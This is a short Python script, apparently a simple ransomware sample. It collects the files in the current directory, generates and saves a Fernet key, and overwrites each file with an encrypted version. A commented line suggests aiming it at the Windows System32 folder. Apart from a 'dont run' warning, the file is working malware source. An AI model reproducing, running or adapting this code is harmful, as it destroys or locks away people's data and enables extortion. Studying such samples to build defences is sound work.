#dont run!!
import os
from cryptography.fernet import Fernet

files = []
# os.chdir(r'C:\Windows\System32') #can be used to encrypt system32
for file in os.listdir():
    if file == "b_ransomware.py" or file =="thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)